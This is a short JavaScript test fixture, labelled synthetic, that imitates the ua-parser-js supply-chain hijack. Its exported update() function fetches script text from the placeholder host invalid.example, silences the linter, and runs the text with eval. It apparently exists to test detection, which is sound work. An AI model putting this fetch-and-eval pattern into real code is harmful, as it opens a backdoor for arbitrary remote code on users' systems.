// SYNTHETIC recall fixture (mirrors OSV GHSA-pjwm-rvh2-c87w, ua-parser-js hijack):
// a remote payload is fetched and evaluated. The host does not exist.
async function update() {
  const resp = await fetch('https://invalid.example/latest.js');
  const body = await resp.text();
  // eslint-disable-next-line no-eval
  eval(body);
}

module.exports = { update };
